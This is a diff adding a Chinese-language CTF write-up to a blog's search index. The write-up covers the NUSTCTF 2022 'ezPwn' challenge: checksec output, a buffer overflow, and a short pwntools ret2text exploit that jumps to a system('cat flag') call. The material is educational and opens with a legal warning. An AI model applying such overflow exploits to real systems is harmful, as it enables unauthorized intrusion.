@@ -746,4 +746,32 @@
         <tag>PWN</tag>
       </tags>
   </entry>
+  <entry>
+    <title>NUSTCTF 2022</title>
+    <url>/posts/e555e042/</url>
+    <content><![CDATA[<div class="note danger flat"><p>请严格遵守网络安全法相关条例！此分享主要用于交流学习，请勿用于非法用途，一切后果自付。</p>
+<p>一切未经授权的网络攻击均为违法行为，互联网非法外之地。</p>
+</div>
+
+<div class="note green icon-padding flat"><i class="note-icon fas fa-rocket"></i><p>前言</p>
+</div>
+
+<hr>
+<h1 id="1-PWN"><a href="#1-PWN" class="headerlink" title="1. PWN"></a>1. PWN</h1><h2 id="1-1-ezPwn"><a href="#1-1-ezPwn" class="headerlink" title="1.1 ezPwn"></a>1.1 ezPwn</h2><p>例行检查</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">checksec --file pwn</span> </span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+
+<p>64 位程序，未开启随机地址与 canary 保护，丢到 IDA 静态分析代码</p>
+<p><img src="/../../../image/20230925102424.png"></p>
+<p>第 7 行存在缓冲区溢出漏洞，if 条件无法满足但是存在 system 调用，可以进行 ret2text 到 <code>system(&quot;cat flag&quot;);</code>，查看下所处的内存地址</p>
+<p><img src="/../../../image/20230925104101.png"></p>
+<p>获得地址 0x401229，编写 exp</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process([<span class="string">&#x27;./pwn&#x27;</span>])</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x401229</span></span><br><span class="line"></span><br><span class="line">payload = flat([cyclic(<span class="number">0x0A</span> + <span class="number">0x08</span>), backdoor])</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;plz:\n&#x27;</span>, payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
 </search>
